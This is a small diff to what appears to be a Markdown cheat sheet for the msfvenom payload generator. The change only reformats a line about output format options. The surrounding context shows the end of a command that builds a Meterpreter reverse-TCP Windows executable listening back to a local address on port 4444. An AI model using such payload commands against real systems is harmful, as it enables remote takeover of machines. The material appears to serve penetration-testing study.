@@ -97,7 +97,7 @@ reverse_tcp -f exe LHOST=192.168.1.1
 LPORT=4444 > met.exe
 ```
 
-- [ ] - Format Options (specified with –f) --help-formats – List available output formats
+Format Options **(specified with –f)** --help-formats – List available output formats
 
 - `-exe` – Executable
 - `-pl` – Perl
